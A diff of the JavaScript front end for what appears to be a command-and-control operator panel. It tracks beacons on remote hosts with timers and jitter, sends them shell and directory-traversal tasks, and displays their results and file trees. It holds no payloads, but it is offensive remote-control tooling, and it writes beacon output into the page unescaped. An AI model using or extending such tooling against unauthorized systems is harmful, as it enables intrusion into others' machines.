@@ -24,12 +24,13 @@ const taskDescriptions = {
 
 document.addEventListener('DOMContentLoaded', () => {
     console.log('Document loaded');
+    populateConfigForm(window.uuid);
     toggleLoadingSpinner(true);
-
+    fetchDirectoryListing()
     initializeWebSocket();
     fetchInitialBeaconData();
     fetchHistory();
-    addEventListeners();
+    addEventListeners(); // This function has been rewritten for clarity and correctness
 
     handleTaskSelection();
     submitTask();
@@ -53,8 +54,8 @@ function initializeWebSocket() {
 
     socket.on('beacon_update', handleBeaconUpdate);
     socket.on('countdown_update', handleCountdownUpdate);
+    socket.on('command_sent', handleCommandSent);
     socket.on('command_response', handleCommandResponse);
-    // **FIX: Added dedicated listener for directory traversal**
     socket.on('directory_traversal', handleDirectoryTraversalResponse);
 }
 
@@ -80,20 +81,28 @@ function handleCountdownUpdate(data) {
     }
 }
 
-function handleCommandResponse(data) {
-    console.log('Received command_response:', data);
+function handleCommandSent(data) {
+    console.log('Received command_sent:', data);
     if (data.uuid === window.uuid) {
-        // Fallback check in case the server sends directory data via this event
-        if (data.command === 'directory_traversal') {
-            updateDirectoryTree(data.response);
-        }
-        updateResultsTab(data); // Update the general results tab
+        data.response = data.response || 'Command sent to beacon, waiting for response...';
+        updateResultsTab(data);
     } else {
         console.warn(`UUID mismatch: received ${data.uuid}, expected ${window.uuid}`);
     }
 }
 
-// **FIX: New function to handle the specific directory traversal event**
+function handleCommandResponse(data) {
+    console.log('Received command_response:', data);
+    if (data.uuid === window.uuid) {
+        if (data.command === 'directory_traversal') {
+            updateDirectoryTree(data.response);
+        }
+        updateResultsTab(data);
+    } else {
+        console.warn(`UUID mismatch: received ${data.uuid}, expected ${window.uuid}`);
+    }
+}
+
 function handleDirectoryTraversalResponse(data) {
     const banner = document.getElementById('command-response-banner');
     banner.textContent = 'New Directory Traversal received.';
@@ -107,19 +116,14 @@ function handleDirectoryTraversalResponse(data) {
     }
 }
 
-
 // =================================================================================
 // API Fetching
 // =================================================================================
 
-
 function fetchDirectoryListing() {
-    // 1. Show a loading spinner so the user knows something is happening.
     showDirSpinner(true);
     console.log(`Fetching initial directory listing for ${window.uuid}...`);
-
-    // 2. Call the new, dedicated API endpoint.
-    fetch(`/api/v1/beacons/${window.uuid}/directory_traversal`)
+    fetch(`/api/v1/beacons?directory_traversal=${window.uuid}`)
         .then(response => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
@@ -127,22 +131,18 @@ function fetchDirectoryListing() {
             return response.json();
         })
         .then(data => {
-            // 3. On success, use the existing function to build and display the tree.
             console.log('Successfully fetched directory listing.');
             updateDirectoryTree(data);
         })
         .catch(error => {
-            // 4. If an error occurs, show a message to the user.
             console.error('Error fetching directory listing:', error);
             const treeContainer = document.getElementById('dir-tree');
             treeContainer.innerHTML = `<div class="alert alert-warning">Could not load directory listing. Run the 'directory_traversal' task to generate it.</div>`;
         })
         .finally(() => {
-            // 5. No matter what, hide the spinner when done.
             showDirSpinner(false);
         });
 }
-
 
 function fetchInitialBeaconData() {
     fetch(`/api/v1/beacons/${window.uuid}`)
@@ -208,11 +208,11 @@ function toggleLoadingSpinner(show) {
 
 function showDirSpinner(show) {
     const treeC = document.getElementById('dir-tree');
-    const listContainer = treeC.querySelector('ul'); // Find the list
+    const listContainer = treeC.querySelector('ul');
     const existingSpinner = document.getElementById('dir-search-spinner');
 
     if (show) {
-        if (listContainer) listContainer.style.display = 'none'; // Hide the list
+        if (listContainer) listContainer.style.display = 'none';
         if (!existingSpinner) {
             const spinnerHtml = `
                 <div id="dir-search-spinner" class="dir-search-spinner-container">
@@ -224,10 +224,9 @@ function showDirSpinner(show) {
         }
     } else {
         if (existingSpinner) existingSpinner.remove();
-        if (listContainer) listContainer.style.display = 'block'; // Show the list
+        if (listContainer) listContainer.style.display = 'block';
     }
 }
-
 
 function updateLastBeacon(data) {
     const beaconTableBody = document.getElementById('beacon-table-body');
@@ -238,19 +237,19 @@ function updateLastBeacon(data) {
 
     const beacon = data.beacon;
     const lastBeaconDate = new Date(beacon.last_beacon);
-
+    const nextBeaconDate = new Date(lastBeaconDate.getTime() + Number(beacon.timer) * 1000);
     let row = document.getElementById(`beacon-${window.uuid}`);
     if (!row) {
         row = document.createElement('tr');
         row.id = `beacon-${window.uuid}`;
         row.innerHTML = `
-            <td>${window.uuid}</td>
+            <td>${uuid}</td>
             <td>${beacon.address}</td>
             <td>${beacon.hostname}</td>
             <td>${beacon.operating_system}</td>
             <td><span class="last-beacon">${formatDateWithoutMilliseconds(lastBeaconDate)}</span></td>
-            <td><span class="next-beacon" id="next-beacon-${window.uuid}"></span></td>
-            <td><span class="countdown" id="countdown-${window.uuid}"></span></td>
+            <td><span class="next-beacon" id="next-beacon-${uuid}">${formatDateWithoutMilliseconds(nextBeaconDate)}</span></td>
+            <td><span class="countdown" id="countdown-${uuid}"></span></td>
         `;
         beaconTableBody.appendChild(row);
     } else {
@@ -264,7 +263,6 @@ function updateLastBeacon(data) {
         timer: beacon.timer,
         jitter: beacon.jitter
     };
-
     console.log('Beacon updated:', data.beacon);
 }
 
@@ -275,14 +273,9 @@ function updateNextBeacon(uuid) {
     const timerData = beaconTimers[uuid];
     if (!timerData) return;
 
-    const {
-        lastBeacon,
-        timer,
-        jitter
-    } = timerData;
+    const { lastBeacon, timer, jitter } = timerData;
     const nextBeaconDate = new Date(lastBeacon.getTime() + Number(timer) * 1000);
     const expectedNextBeaconDate = new Date(nextBeaconDate.getTime() + Number(jitter) * 1000);
-
     const currentTime = new Date();
     const timeDiff = nextBeaconDate - currentTime;
     const jitterDiff = expectedNextBeaconDate - currentTime;
@@ -300,17 +293,11 @@ function updateNextBeacon(uuid) {
 }
 
 function updateCountdownUI(data) {
-    const {
-        uuid,
-        timer,
-        jitter
-    } = data;
+    const { uuid, timer, jitter } = data;
     const countdownElement = document.querySelector(`#countdown-${uuid}`);
-
     const lastBeacon = beaconTimers[uuid].lastBeacon;
     const nextBeaconDate = new Date(lastBeacon.getTime() + (timer * 1000));
     const expectedNextBeaconDate = new Date(nextBeaconDate.getTime() + (jitter * 1000));
-
     const currentTime = new Date();
     const timeDiff = nextBeaconDate - currentTime;
     const jitterDiff = expectedNextBeaconDate - currentTime;
@@ -373,9 +360,8 @@ function updateResultsTab(data) {
 
 function updateDirectoryTree(response) {
     const treeContainer = document.getElementById('dir-tree');
-    treeContainer.innerHTML = ''; // Clear previous content
+    treeContainer.innerHTML = '';
 
-    // Helper function to process the final JSON object
     const processJson = (json) => {
         if (!json || Object.keys(json).length === 0) {
             treeContainer.innerHTML = '<div class="text-center text-muted mt-3">No directory data found. <br> Run the directory_traversal task.</div>';
@@ -385,9 +371,7 @@ function updateDirectoryTree(response) {
     };
 
     if (typeof response === 'string') {
-        // If we have a string, use the worker to parse it off the main thread
         const worker = new Worker('/static/parser.worker.js');
-
         worker.onmessage = function(event) {
             if (event.data.success) {
                 processJson(event.data.data);
@@ -395,51 +379,139 @@ function updateDirectoryTree(response) {
                 console.error('Worker failed to parse JSON:', event.data.error);
                 treeContainer.innerHTML = `<div class="alert alert-danger">Error parsing directory data in worker.</div>`;
             }
-            worker.terminate(); // Clean up the worker
+            worker.terminate();
         };
-        
         worker.onerror = function(error) {
             console.error('An error occurred in the JSON parser worker:', error);
             worker.terminate();
         };
-
-        // Send the JSON string to the worker to start parsing
         worker.postMessage(response);
-
     } else {
-        // If it's already an object (from fetch), process it directly
         processJson(response);
     }
 }
 
+function updateBeaconConfig(uuid) {
+    const callbackRateInput = document.getElementById('callbackRate');
+    const jitterInput = document.getElementById('jitter');
+    const banner = document.getElementById('command-response-banner');
+
+    if (!callbackRateInput || !jitterInput || !banner) {
+        console.error("Config inputs or banner element not found");
+        return;
+    }
+
+    const command_id = generateUUID();
+    const timer = parseInt(callbackRateInput.value, 10);
+    const jitter = parseInt(jitterInput.value, 10);
+
+    if (isNaN(timer) || isNaN(jitter)) {
+        banner.textContent = "Please enter valid numeric values for Timer and Jitter.";
+        banner.classList.remove('d-none', 'alert-success');
+        banner.classList.add('alert-danger');
+        setTimeout(() => banner.classList.add('d-none'), 3000);
+        return;
+    }
+
+    const payload = {
+        command_id: command_id,
+        timer: timer,
+        jitter: jitter
+    };
+
+    fetch(`/api/v1/beacons?update=${uuid}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.text().then(text => {
+                throw new Error(`Error ${response.status}: ${text}`);
+            });
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log("Beacon configuration updated:", data);
+        banner.textContent = 'Beacon configuration updated successfully.';
+        banner.classList.remove('d-none', 'alert-danger');
+        banner.classList.add('alert-success');
+        setTimeout(() => banner.classList.add('d-none'), 3000);
+
+        beaconTimers[uuid] = {
+            ...beaconTimers[uuid],
+            timer: timer,
+            jitter: jitter
+        };
+        updateNextBeacon(uuid);
+    })
+    .catch(error => {
+        console.error("Error updating beacon configuration:", error);
+        banner.textContent = `Failed to update configuration: ${error.message}`;
+        banner.classList.remove('d-none', 'alert-success');
+        banner.classList.add('alert-danger');
+        setTimeout(() => banner.classList.add('d-none'), 3000);
+    });
+}
+
+function populateConfigForm(uuid) {
+    fetch(`/api/v1/beacons/${uuid}`)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to fetch beacon data');
+            }
+            return response.json();
+        })
+        .then(data => {
+            const beacon = data.beacon;
+            if (beacon) {
+                const callbackRateInput = document.getElementById('callbackRate');
+                const jitterInput = document.getElementById('jitter');
+                if (callbackRateInput && jitterInput) {
+                    callbackRateInput.value = beacon.timer;
+                    jitterInput.value = beacon.jitter;
+                }
+            } else {
+                console.error('Beacon data not found in API response');
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching beacon data:', error);
+        });
+}
+
 // =================================================================================
-// DOM and Event Listeners
+// DOM and Event Listeners (REWRITTEN FOR CORRECTNESS)
 // =================================================================================
 
 function addEventListeners() {
+    // Tab navigation event listeners
     document.getElementById('task-btn').addEventListener('click', (event) => showInfo('task-info', event));
     document.getElementById('results-btn').addEventListener('click', (event) => showInfo('results-info', event));
     document.getElementById('directory-btn').addEventListener('click', (event) => {
         showInfo('directory-info', event);
     });
-    document.getElementById('media-btn').addEventListener('click', (event) => showInfo('media-info', event));
+    document.getElementById('config-btn').addEventListener('click', (event) => showInfo('config-info', event));
 
+    // Event listener for the Directory Traversal search input
     let searchTimeout;
     document.getElementById('dir-search').addEventListener('input', e => {
         clearTimeout(searchTimeout);
         const treeC = document.getElementById('dir-tree');
         const listItems = treeC.querySelectorAll('li');
-        const summaryEl = document.getElementById('search-results-summary'); // Get the summary element
+        const summaryEl = document.getElementById('search-results-summary');
 
         if (listItems.length > 0) {
             showDirSpinner(true);
         }
-        
         const term = e.target.value.toLowerCase();
 
         searchTimeout = setTimeout(() => {
             let hasVisibleItems = false;
-            let hitCount = 0; // Initialize hit counter
+            let hitCount = 0;
 
             listItems.forEach(li => {
                 const nodeName = li.dataset.name;
@@ -452,8 +524,6 @@ function addEventListeners() {
                 
                 if (isVisible) {
                     hasVisibleItems = true;
-                    // To get an accurate count, we only count a visible item if its parent is hidden.
-                    // This prevents counting every file inside a matched folder.
                     const parentLi = li.parentElement.closest('li');
                     if (!parentLi || parentLi.style.display === 'none') {
                         hitCount++;
@@ -463,9 +533,8 @@ function addEventListeners() {
 
             showDirSpinner(false);
 
-            // Update search summary text
             if (term === '') {
-                summaryEl.textContent = ''; // Clear summary if search is empty
+                summaryEl.textContent = '';
             } else if (hitCount === 1) {
                 summaryEl.textContent = 'Found 1 result.';
             } else {
@@ -483,7 +552,18 @@ function addEventListeners() {
         }, 300);
     });
 
+    // Set an interval to update the beacon status countdown every second
     setInterval(() => updateNextBeacon(window.uuid), 1000);
+
+    // REWRITTEN & SIMPLIFIED: This now calls the existing 'updateBeaconConfig' function,
+    // which eliminates code duplication and fixes the original "banner is not defined" error.
+    document.getElementById('configForm').addEventListener('submit', function(event) {
+        // Prevent the default form submission behavior (page reload)
+        event.preventDefault();
+
+        // Call the dedicated function to handle the validation and API call
+        updateBeaconConfig(window.uuid);
+    });
 }
 
 function showInfo(infoId, event) {
@@ -493,7 +573,6 @@ function showInfo(infoId, event) {
 
     const clickedButton = event.target;
     const direction = clickedButton.getAttribute('data-direction');
-
     const slideOutClass = direction === 'left' ? 'slide-out-right' : 'slide-out-left';
     const slideInClass = direction === 'left' ? 'slide-in-left' : 'slide-in-right';
 
@@ -503,12 +582,9 @@ function showInfo(infoId, event) {
     currentInfo.addEventListener('animationend', () => {
         currentInfo.classList.add('d-none');
         currentInfo.classList.remove(slideOutClass);
-
         newInfo.classList.remove('d-none');
         newInfo.classList.add(slideInClass);
-    }, {
-        once: true
-    });
+    }, { once: true });
 }
 
 function handleTaskSelection() {
@@ -528,7 +604,6 @@ function handleTaskSelection() {
             if (tasksRequiringInput.includes(selectedValue)) {
                 taskInput.classList.remove('d-none', 'hide');
                 taskInput.classList.add('show');
-                // Set placeholder for directory traversal
                 if (selectedValue === 'directory_traversal') {
                     taskTextbox.placeholder = "Enter path (e.g., . or C:\\Users)";
                 } else {
@@ -548,7 +623,6 @@ function handleTaskSelection() {
         }
         validateForm();
     });
-
     taskTextbox.addEventListener('input', validateForm);
 }
 
@@ -557,9 +631,7 @@ function submitTask() {
     submitBtn.addEventListener('click', () => {
         const taskSelect = document.getElementById('task-select').value;
         const taskInput = document.getElementById('task-textbox').value.trim();
-
         const tasksRequiringInput = ['list_dir', 'shell'];
-        // Directory traversal can be sent with an empty input (defaults to '.')
         const requiresInput = tasksRequiringInput.includes(taskSelect);
 
         if (!taskSelect || (requiresInput && !taskInput)) {
@@ -568,7 +640,6 @@ function submitTask() {
         }
 
         const command_id = generateUUID();
-        // For directory_traversal, if input is empty, send '.' as the default path
         const dataForTask = (taskSelect === 'directory_traversal' && taskInput === '') ? '.' : taskInput;
 
         const payload = {
@@ -578,22 +649,20 @@ function submitTask() {
         };
 
         fetch(`/api/v1/beacons?command=${window.uuid}`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
-                showConfirmationAlert();
-                addTaskToResultsTab(command_id, taskSelect, dataForTask);
-                resetTaskForm();
-            })
-            .catch(error => {
-                console.error('Error submitting task:', error);
-                alert('Failed to submit task.');
-            });
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Network response was not ok');
+            showConfirmationAlert();
+            addTaskToResultsTab(command_id, taskSelect, dataForTask);
+            resetTaskForm();
+        })
+        .catch(error => {
+            console.error('Error submitting task:', error);
+            alert('Failed to submit task.');
+        });
     });
 }
 
@@ -631,8 +700,8 @@ function formatTime(seconds) {
 
 function generateUUID() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0,
-            v = c === 'x' ? r : (r & 0x3 | 0x8);
+        const r = Math.random() * 16 | 0;
+        const v = c === 'x' ? r : (r & 0x3 | 0x8);
         return v.toString(16);
     });
 }
@@ -673,11 +742,30 @@ function createHistoryTable(history) {
         history.forEach(item => {
             const tr = document.createElement('tr');
             tr.setAttribute('data-command-id', item.command_id);
-            const commandText = item.data ? `${item.command} ${item.data}` : item.command;
+
+            //
+            // FIX: Add special handling for the 'update' command's display.
+            //
+            let commandText = item.command;
+            let responseText = item.response || ''; // Default to empty string if no response
+
+            if (item.command === 'update' && item.data && typeof item.data === 'object') {
+                // Format the object into a readable string
+                commandText += ` (Timer: ${item.data.timer}s, Jitter: ${item.data.jitter}s)`;
+                
+                // If the response is missing on reload, provide a default one.
+                if (!responseText) {
+                    responseText = 'Timer and jitter settings updated.';
+                }
+            } else if (item.data) {
+                // Keep original behavior for all other commands
+                commandText += ` ${item.data}`;
+            }
+            
             tr.innerHTML = `
                 <td>${item.command_id}</td>
                 <td>${commandText}</td>
-                <td><pre><code>${item.response}</code></pre></td>
+                <td><pre><code>${responseText}</code></pre></td>
             `;
             tbody.appendChild(tr);
         });
@@ -693,7 +781,6 @@ function buildTree(obj) {
     const ul = document.createElement('ul');
     ul.className = 'list-group list-group-flush';
 
-    // Helper function to format file sizes
     function formatBytes(bytes, decimals = 2) {
         if (!+bytes) return '0 Bytes';
         const k = 1024;
@@ -711,14 +798,10 @@ function buildTree(obj) {
         li.className = 'list-group-item p-0';
         li.dataset.name = key.toLowerCase();
 
-        // A branch is an object that isn't a file (doesn't have a 'size' property)
         const isBranch = value && typeof value === 'object' && !value.hasOwnProperty('size');
         
-        // --- LAZY LOADING LOGIC ---
-        // Mark the branch as not yet built
         if (isBranch) {
             li.dataset.isBuilt = 'false';
-            // Store the raw children data on the element itself to be used later
             li.dataset.children = JSON.stringify(value); 
         }
 
@@ -731,17 +814,15 @@ function buildTree(obj) {
                 const toggle = header.querySelector('.toggle');
                 const isOpen = toggle.textContent === '▾';
 
-                // On first click, build the sub-tree
                 if (li.dataset.isBuilt === 'false') {
                     const childrenData = JSON.parse(li.dataset.children);
                     const childUl = buildTree(childrenData);
                     childUl.classList.add('ml-4');
                     li.appendChild(childUl);
-                    li.dataset.isBuilt = 'true'; // Mark as built
-                    li.dataset.children = ''; // Clear the stored data
+                    li.dataset.isBuilt = 'true';
+                    li.dataset.children = '';
                 }
 
-                // Toggle visibility
                 const childUl = li.querySelector('ul');
                 if (childUl) {
                     childUl.style.display = isOpen ? 'none' : 'block';
@@ -749,7 +830,6 @@ function buildTree(obj) {
                 toggle.textContent = isOpen ? '▸' : '▾';
                 
             } else {
-                // This part is for files and remains the same
                 const fileInfoBody = document.getElementById('fileInfoBody');
                 const createdDate = new Date(value.created).toLocaleString();
                 const modifiedDate = new Date(value.lastModified).toLocaleString();
@@ -765,7 +845,6 @@ function buildTree(obj) {
             }
         };
 
-        // --- UI elements remain mostly the same ---
         const icon = document.createElement('span');
         icon.textContent = getIconForFile(key, isBranch);
         icon.className = isBranch ? 'folder-icon' : 'file-icon';
@@ -784,34 +863,18 @@ function buildTree(obj) {
         li.appendChild(header);
         ul.appendChild(li);
     }
-
     return ul;
 }
-
 
 function getIconForFile(key, isBranch) {
     if (isBranch) return '📁';
     const ext = key.split('.').pop().toLowerCase();
     const iconMap = {
-        'png': '🖼️',
-        'jpg': '🖼️',
-        'jpeg': '🖼️',
-        'gif': '🖼️',
-        'bmp': '🖼️',
-        'svg': '🖼️',
-        'pdf': '📕',
-        'doc': '📄',
-        'docx': '📄',
-        'xls': '📊',
-        'xlsx': '📊',
-        'csv': '📊',
-        'mp3': '🎵',
-        'wav': '🎵',
-        'ogg': '🎵',
-        'mp4': '🎞️',
-        'avi': '🎞️',
-        'mov': '🎞️',
-        'mkv': '🎞️'
+        'png': '🖼️', 'jpg': '🖼️', 'jpeg': '🖼️', 'gif': '🖼️', 'bmp': '🖼️', 'svg': '🖼️',
+        'pdf': '📕', 'doc': '📄', 'docx': '📄',
+        'xls': '📊', 'xlsx': '📊', 'csv': '📊',
+        'mp3': '🎵', 'wav': '🎵', 'ogg': '🎵',
+        'mp4': '🎞️', 'avi': '🎞️', 'mov': '🎞️', 'mkv': '🎞️'
     };
     return iconMap[ext] || '📃';
 }
@@ -832,13 +895,11 @@ function addTaskToResultsTab(command_id, taskSelect, taskData) {
     }
     const tr = document.createElement('tr');
     tr.setAttribute('data-command-id', command_id);
-
     const commandText = taskData ? `${taskSelect} ${taskData}` : taskSelect;
-
     tr.innerHTML = `
         <td>${command_id}</td>
         <td>${commandText}</td>
-        <td>Awaiting Response...</td>
+        <td>Waiting to send to beacon...</td>
     `;
     resultsTableBody.appendChild(tr);
 }
